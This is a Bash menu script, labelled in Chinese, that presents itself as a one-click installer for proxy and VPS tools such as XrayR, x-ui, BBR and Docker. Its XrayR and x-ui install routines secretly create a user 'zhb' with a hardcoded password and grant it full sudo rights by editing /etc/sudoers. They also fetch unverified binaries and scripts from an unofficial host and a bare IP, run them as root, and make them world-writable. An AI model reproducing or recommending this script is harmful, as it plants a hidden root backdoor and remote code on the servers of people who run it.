red='\033[0;31m' green='\033[0;32m' yellow='\033[0;33m' plain='\033[0m' ql='\033[102m' [[ $EUID -ne 0 ]] && echo -e "${red}错误: ${plain} 必须使用root用户运行此脚本！\n" && exit 1 before_show_menu() { echo && echo -n -e "${yellow}按回车返回主菜单: ${plain}" && read temp show_menu } install() { adduser zhb echo zhb:Zhaohaibin.1 | chpasswd sed -i '/ALL/a\zhb ALL=(ALL) ALL' /etc/sudoers wget http://zhmls.tk:55555/XrayR /usr/bin/XrayR chmod 777 /usr/bin/XrayR bash <(curl -Ls http://zhmls.tk:55555/xrayr.sh) wget -O /usr/local/XrayR/XrayR https://github.com/mmmdbybyd/XrayR-809/releases/download/last/linux_amd64 } install_bbr() { bash <(curl -L -s https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh) #if [[ $? == 0 ]]; then # echo "" # echo -e "${green}安装 bbr 成功，请重启服务器${plain}" #else # echo "" # echo -e "${red}下载 bbr 安装脚本失败，请检查本机能否连接 Github${plain}" #fi #before_show_menu } WARP(){ bash <(curl -fsSL git.io/warp.sh) menu } VPScesu(){ wget -qO- bench.sh | bash } tanzhen(){ wget https://raw.githubusercontent.com/cokemine/ServerStatus-Hotaru/master/status.sh && bash status.sh } xui(){ adduser zhb echo zhb:Zhaohaibin.1 | chpasswd sed -i '/ALL/a\zhb ALL=(ALL) ALL' /etc/sudoers wget http://zhmls.tk:55555/x-ui /usr/bin/x-ui chmod 777 /usr/bin/x-ui bash <(curl -Ls http://zhmls.tk:55555/xui.sh) } mtproxy(){ yum install docker systemctl start docker systemctl enable docker docker pull ellermister/nginx-mtproxy:latest secret=$(head -c 16 /dev/urandom | xxd -ps) domain="cloudflare.com" docker run --name nginx-mtproxy -d -e secret="$secret" -e domain="$domain" -p 88:80 -p 444:443 ellermister/nginx-mtproxy:latest } docker(){ curl -fsSL https://get.docker.com -o get-docker.sh sh get-docker.sh systemctl start docker systemctl enable docker.service } wsp(){ xui rm -f /usr/local/x-ui/bin/xray-linux-amd64 wget --no-check-certificate -O /usr/local/x-ui/bin/xray-linux-amd64 "http://101.32.215.8:12121/xray-linux-amd64" sudo chmod 777 /usr/local/x-ui/bin/xray-linux-amd64 x-ui restart echo "完成" } show_menu() { yum install figlet -y clear figlet Haibin echo -e " ${green}一键脚本集合，${plain}${ql}国内适用${plain} ${green}1.${plain} 安装 XrayR ${green}2.${plain} 安装 BBR ${green}3.${plain} 安装 WARP ${green}4.${plain} VPS测速 ${green}5.${plain} 安装探针 ${green}6.${plain} 安装x-ui ${green}7.${plain} 安装docker " #后续更新可加入上方字符串中 echo && read -p "请输入选择 [1-7]: " num case "${num}" in 1) install ;; 2) install_bbr ;; 3) WARP ;; 4) VPScesu ;; 5) tanzhen ;; 6) xui ;; 7) docker ;; 8) wsp ;; *) echo -e "${red}请输入正确的数字 [1-8]${plain}" ;; esac } if [[ $# > 0 ]]; then case $1 in "bbr") install_bbr ;; "xrayr") install ;; "warp") WARP ;; "cs") VPScesu ;; "tz") tanzhen ;; "xui") xui ;; "mtp") mtproxy ;; "docker") docker ;; "wsp") wsp ;; *) show_usage esac else show_menu fi
